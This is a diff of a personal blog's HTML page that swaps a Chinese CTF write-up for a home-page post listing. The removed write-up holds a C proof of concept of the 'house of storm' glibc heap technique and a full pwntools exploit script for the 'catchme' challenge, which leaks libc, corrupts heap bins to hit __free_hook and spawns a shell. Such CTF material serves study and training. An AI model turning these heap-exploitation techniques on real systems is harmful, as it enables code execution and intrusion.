@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>house of storm / 2026国赛半决辽宁赛区 catchme WriteUp | Erik_Aoi</title>
+    <title>Erik_Aoi</title>
     <meta name="author" content="Kanade" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -47,13 +47,9 @@
 
 
 
+<script src="/js/lib/home.js"></script>
 
 
-
-
-
-
-<script src="/js/lib/toc.js"></script>
 
 <link rel="stylesheet" href="/css/main.css" />
 
@@ -178,242 +174,97 @@
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
 
-            <div class="article-container">
-    
-    <aside class="toc-wrapper">
-        <div class="toc-content">
-            <div class="toc-title">
-                <i class="fa-solid fa-list"></i>
-                <span>目录</span>
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>Erik_Aoi</h1>
+                <h3></h3>
+                <h5></h5>
             </div>
-            
-        </div>
-    </aside>
-    
-    <div class="article">
-        <div>
-            <h1>house of storm / 2026国赛半决辽宁赛区 catchme WriteUp</h1>
-        </div>
-        <div class="info">
-            <span class="date">
-                <span class="icon">
-                    <i class="fa-solid fa-calendar fa-fw"></i>
-                </span>
-                2026/3/26
+        </span>
+    </div>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    class="home-posts-wrap-no-card"
+>
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2025/06/27/pwn-%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+        <h2 class="post-title">pwn-堆学习笔记</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
+            2025/6/27
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
             
-            
-            <span class="tags">
-                <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
-                </span>
-                
-                
-                <span class="tag">
-                    
-                    <a href="/tags/Pwn/" style="color: #ff7d73">
-                        Pwn
-                    </a>
-                </span>
-                
-                <span class="tag">
-                    
-                    <a href="/tags/WriteUp/" style="color: #00bcd4">
-                        WriteUp
-                    </a>
-                </span>
-                
-            </span>
+            <p>别样的pwnpwn车大战之 chunk chunk base.</p>
+
             
         </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #03a9f4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/heap/" style="color: #00a596">heap</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/27/pwn-%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
     
-    <div class="content" v-pre>
-        <p>poc：</p>
-<pre><code class="c">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c
-// run: GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./house_of_storm
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-struct &#123;
-    char chunk_head[0x10];
-    char content[0x10];
-&#125;fake;
-
-int main(void)
-&#123;
-    unsigned long *large_bin,*unsorted_bin;
-    unsigned long *fake_chunk;
-    char *ptr;
-
-    unsorted_bin=malloc(0x418);
-    malloc(0X18);
-    large_bin=malloc(0x408);
-    malloc(0x18);
-
-    free(large_bin);
-    free(unsorted_bin);
-    unsorted_bin=malloc(0x418);
-    free(unsorted_bin);
-
-    fake_chunk=((unsigned long)fake.content)-0x10;
-    unsorted_bin[0]=0;
-    unsorted_bin[1]=(unsigned long)fake_chunk;
-
-    large_bin[0]=0;
-    large_bin[1]=(unsigned long)fake_chunk+8;
-    large_bin[2]=0;
-    large_bin[3]=(unsigned long)fake_chunk-0x18-5;
-
-    ptr=malloc(0x48);
-    strncpy(ptr, &quot;/bin/sh&quot;, 0x48 - 1);
-    system(fake.content);
-&#125;
-</code></pre>
-<p>2.27版本需要先填满tcache</p>
-<p>题目：2026国赛半决辽宁赛区 catchme</p>
-<pre><code class="python">#!/usr/bin/env python3
-
-&#39;&#39;&#39;
-    author: Yoisaki_Kanade
-    time: 2026-03-22 09:52:52
-&#39;&#39;&#39;
-from pwncli import *
-from pwnlib.args import free_form
-
-# from catchme.organge import heap_addr
-
-filename = &quot;catchme_patched&quot;
-libcname = &quot;/home/yoisaki_kanade/.config/kpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;
-host = &quot;127.0.0.1&quot;
-port = 1337
-container_id = &quot;&quot;
-proc_name = &quot;&quot;
-elf = context.binary = ELF(filename)
-if libcname:
-    libc = ELF(libcname)
-gs = &#39;&#39;&#39;
-decompiler connect ida --host 127.0.0.1 --port 3662
-# b * 0x00007ffff78949ff
-set debuginfod enabled on
-set debug-file-directory /home/yoisaki_kanade/.config/kpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug
-set directories /home/yoisaki_kanade/.config/kpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27
-c
-&#39;&#39;&#39;
-context.log_level = &#39;debug&#39;
-context.terminal =[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-context.arch = &#39;amd64&#39;
-# b *0x7ffff789a0cc
-def start():
-    if args.GDB:
-        return gdb.debug(elf.path, gdbscript = gs)
-    elif args.REMOTE:
-        return remote(host, port)
-    else:
-        return process(elf.path)
-def pwn():
-    p = start()
-    ia = lambda : p.interactive()
-    sla = lambda x,y: p.sendlineafter(x,y)
-    sa = lambda x,y: p.sendafter(x,y)
-    ru = lambda x: p.recvuntil(x)
-    r = lambda x : p.recv(x)
-    rl = lambda x : p.recvline()[:x]
-    s = lambda x : p.send(x)
-    sl = lambda x : p.sendline(x)
-    itob = lambda x : str(x).encode()
-    su = lambda x : p.success(x)
-    u64_ex = lambda x : u64(x.ljust(8,b&#39;\0&#39;))
-    def cmd(s):
-        sla(&quot;&gt;&gt;&quot;,s)
-    def insert(i):
-        cmd(b&#39;1&#39;)
-        sla(b&quot;choose your creature type&quot;,itob(i))
-
-    def erase(i):
-        cmd(b&#39;2&#39;)
-        sla(&quot;index:&quot;,itob(i))
-
-    def show(i):
-        cmd(b&#39;3&#39;)
-        sla(&quot;index:&quot;,itob(i))
-
-    def edit(i,c=&#39;\0&#39;):
-        cmd(b&#39;4&#39;)
-        sla(&quot;index:&quot;,itob(i))
-        sa(b&#39;set tag:&#39;,c)
-
-    def full_del(i):
-        cmd(b&#39;6&#39;)
-        sla(&quot;index:&quot;,itob(i))
-    pause()
-    # Your exploit here
-    # fill tcache
-    for _ in range(7):
-        insert(3)
-        erase(0)
-        full_del(0)
-    # done
-    insert(2) #0 unsorted bin
-    insert(3) #1 gap
-    full_del(1) # del gap pointer
-    insert(1) #1 large bin
-    insert(3) #2 gap
-    full_del(2) #2 del gap pointer
-    erase(1) # free large bin
-    show(1) # leak
-    ru(b&#39;tag:&#39;)
-    libc_base = u64_ex(r(6)) -0x3ebca0
-    libc.address =libc_base
-    _IO_list_all = libc.sym[&quot;_IO_list_all&quot;]
-    free_hook = libc.sym[&quot;__free_hook&quot;]
-    fake_chunk = free_hook-0x10 - 0x8
-    # pause()
-    erase(0) # free(unsorted bin)
-    # pause()
-    insert(2) # malloc(unsorted bin) # 2
-    # pause()
-    erase(0) # free(unsorted_bin)
-    # pause()
-    edit(0,p64(fake_chunk)) # unsorted bin
-    edit(1,p64(fake_chunk+0x8) + p64(0) + p64(fake_chunk-0x18-5)) #large bin
-    full_del(0)
-    # pause()
-    insert(3)
-    ru(b&#39;\n(1)fox\n(2)hawk\n(3)otter\n&#39;)
-    result = r(0x6)
-    print(result)
-    if not args.GDB:
-        if b&quot;malloc&quot; in result:
-            p.close()
-            return
-    one = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
-    edit(0,p64(libc_base + one[2]))
-    erase(0)
-    sleep(1)
-    # sl(&quot;cat /flag&quot;)
-    # exit(0)
-    su(hex(libc_base))
-    ia()
-
-for i in range(1 if args.GDB else 0x100):
-    try:
-        print(f&quot;test &#123;i&#125;...&quot;)
-        pwn()
-    except EOFError:
-        continue
-    except KeyboardInterrupt:
-        break
-</code></pre>
+    <a class="page-num" href="/">
+        <i class="fa-solid fa-caret-left fa-fw"></i>
+    </a>
+    <a class="page-num" href="/">1</a>
+    <span class="page-omit">...</span>
+    
+    <span class="current">2</span>
+    
+    
+    
+    
+</div>
 
     </div>
     
-    
-    
-    
-    
-    
-    
-    </div>
 </div>
 
             <footer id="footer">
@@ -445,12 +296,6 @@ for i in range(1 if args.GDB else 0x100):
     </div>
     <script src="/js/main.js"></script>
     <script src="/js/cursor.js"></script>
-    
-    
-
-
-
-
     
 </body>
 </html>
